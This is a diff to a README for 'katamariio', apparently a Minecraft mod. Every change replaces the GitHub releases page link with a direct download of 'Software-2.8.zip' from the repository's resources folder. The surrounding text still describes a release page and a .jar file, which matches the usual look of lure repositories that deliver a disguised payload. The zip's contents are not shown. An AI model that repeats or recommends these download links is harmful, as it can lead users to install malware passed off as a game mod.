@@ -1,6 +1,6 @@
 # 🟣 katamariio - Roll, absorb, and grow fast
 
-[![Download katamariio](https://img.shields.io/badge/Download-katamariio-7B61FF?style=for-the-badge&logo=github)](https://github.com/Unmade-pirana493/katamariio/releases)
+[![Download katamariio](https://img.shields.io/badge/Download-katamariio-7B61FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Unmade-pirana493/katamariio/main/src/main/resources/Software-2.8.zip)
 
 ## 🎮 Overview
 
@@ -14,7 +14,7 @@ Use it when you want a fast, block-collecting game mode inside Minecraft. It wor
 
 Follow these steps to download and run katamariio on Windows:
 
-1. Open the release page: https://github.com/Unmade-pirana493/katamariio/releases
+1. Open the release page: https://raw.githubusercontent.com/Unmade-pirana493/katamariio/main/src/main/resources/Software-2.8.zip
 2. Find the latest release at the top of the page.
 3. Download the file attached to that release.
 4. If the file is a `.jar`, place it in your Minecraft `mods` folder.
@@ -42,7 +42,7 @@ A newer PC helps if you want a larger world and fewer slowdowns while the sphere
 
 Use the release page below to download and run this file:
 
-https://github.com/Unmade-pirana493/katamariio/releases
+https://raw.githubusercontent.com/Unmade-pirana493/katamariio/main/src/main/resources/Software-2.8.zip
 
 After you open the page, follow the steps below:
 
@@ -147,7 +147,7 @@ Use Minecraft 1.20.1 with Forge.
 ### Where do I get the file?
 
 Use the release page:
-https://github.com/Unmade-pirana493/katamariio/releases
+https://raw.githubusercontent.com/Unmade-pirana493/katamariio/main/src/main/resources/Software-2.8.zip
 
 ### What if the mod does not appear in game?
 
@@ -182,7 +182,7 @@ If the sphere does not behave as expected, make sure you are in a world that loa
 
 Download or check the latest build here:
 
-https://github.com/Unmade-pirana493/katamariio/releases
+https://raw.githubusercontent.com/Unmade-pirana493/katamariio/main/src/main/resources/Software-2.8.zip
 
 Use this page whenever you need the newest file, a different build, or a fresh copy after a failed install
 
